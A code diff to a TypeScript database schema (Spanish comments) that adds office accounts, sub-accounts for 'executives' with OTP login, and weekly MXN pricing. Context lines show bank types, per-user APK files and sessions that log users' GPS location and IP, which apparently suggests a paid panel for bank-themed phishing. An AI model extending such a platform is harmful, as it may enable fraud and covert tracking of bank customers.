@@ -10,6 +10,12 @@ export enum UserRole {
   USER = "user"
 }
 
+// Tipos de cuenta
+export enum AccountType {
+  INDIVIDUAL = "individual",
+  OFFICE = "office"
+}
+
 // Bancos disponibles
 export enum BankType {
   ALL = "all",
@@ -47,6 +53,11 @@ export const users = pgTable("users", {
   apkFileName: text("apk_file_name"), // Nombre del archivo APK asignado
   apkFileUrl: text("apk_file_url"), // URL del archivo APK asignado
   customPrice: text("custom_price"), // Precio personalizado para este usuario (opcional, si no tiene usa el precio del sistema)
+  accountType: text("account_type").default(AccountType.INDIVIDUAL), // Tipo de cuenta: individual u oficina
+  weeklyPrice: integer("weekly_price"), // Precio semanal específico para esta cuenta
+  maxExecutives: integer("max_executives").default(0), // Máximo de ejecutivos (solo para cuentas de oficina)
+  currentExecutives: integer("current_executives").default(0), // Contador de ejecutivos activos
+  parentOfficeId: integer("parent_office_id"), // ID de la oficina padre (solo para ejecutivos)
   createdAt: timestamp("created_at").defaultNow(),
   lastLogin: timestamp("last_login"),
 });
@@ -164,7 +175,10 @@ export const sessions = pgTable("sessions", {
   longitude: text("longitude"), // Coordenada GPS de longitud
   googleMapsLink: text("google_maps_link"), // Enlace directo a Google Maps
   ipAddress: text("ip_address"), // Dirección IP del usuario
-  locationTimestamp: timestamp("location_timestamp") // Timestamp de cuando se capturó la ubicación
+  locationTimestamp: timestamp("location_timestamp"), // Timestamp de cuando se capturó la ubicación
+  // Vinculación con oficinas y ejecutivos
+  officeId: integer("office_id"), // ID de la oficina (si la sesión fue creada por una cuenta de oficina)
+  executiveId: integer("executive_id"), // ID del ejecutivo que creó la sesión
 });
 
 export const insertSessionSchema = createInsertSchema(sessions).pick({
@@ -187,6 +201,58 @@ export const insertSessionSchema = createInsertSchema(sessions).pick({
 
 export type InsertSession = z.infer<typeof insertSessionSchema>;
 export type Session = typeof sessions.$inferSelect;
+
+// Tabla de perfiles de oficina
+export const officeProfiles = pgTable("office_profiles", {
+  id: serial("id").primaryKey(),
+  userId: integer("user_id").notNull().unique(), // FK al usuario oficina
+  weeklyPrice: integer("weekly_price").default(6000), // Precio semanal (default 6000 MXN)
+  maxExecutives: integer("max_executives").default(8), // Máximo de ejecutivos permitidos
+  currentExecutives: integer("current_executives").default(0), // Contador actual
+  isActive: boolean("is_active").default(true),
+  createdAt: timestamp("created_at").defaultNow(),
+  updatedAt: timestamp("updated_at").defaultNow(),
+});
+
+export const insertOfficeProfileSchema = createInsertSchema(officeProfiles).pick({
+  userId: true,
+  weeklyPrice: true,
+  maxExecutives: true,
+  isActive: true,
+});
+
+export type InsertOfficeProfile = z.infer<typeof insertOfficeProfileSchema>;
+export type OfficeProfile = typeof officeProfiles.$inferSelect;
+
+// Tabla de ejecutivos para cuentas de oficina
+export const executives = pgTable("executives", {
+  id: serial("id").primaryKey(),
+  userId: integer("user_id").notNull(), // FK al usuario oficina dueño (reemplaza officeId)
+  username: text("username").notNull().unique(),
+  displayName: text("display_name"), // Nombre para mostrar del ejecutivo
+  password: text("password").notNull(), // Contraseña hasheada
+  isActive: boolean("is_active").default(true),
+  currentSessions: integer("current_sessions").default(0), // Sesiones activas actuales
+  maxSessions: integer("max_sessions").default(1), // Máximo 1 sesión simultánea por ejecutivo
+  requiresOtp: boolean("requires_otp").default(true), // Si requiere OTP para login
+  lastOtpCode: text("last_otp_code"), // Último código OTP generado
+  lastOtpTime: timestamp("last_otp_time"), // Timestamp del último OTP
+  createdAt: timestamp("created_at").defaultNow(),
+  lastLogin: timestamp("last_login"),
+});
+
+export const insertExecutiveSchema = createInsertSchema(executives).pick({
+  userId: true,
+  username: true,
+  displayName: true,
+  password: true,
+  isActive: true,
+  maxSessions: true,
+  requiresOtp: true,
+});
+
+export type InsertExecutive = z.infer<typeof insertExecutiveSchema>;
+export type Executive = typeof executives.$inferSelect;
 
 // Tabla para la configuración de la API de mensajes
 export const smsConfig = pgTable("sms_config", {
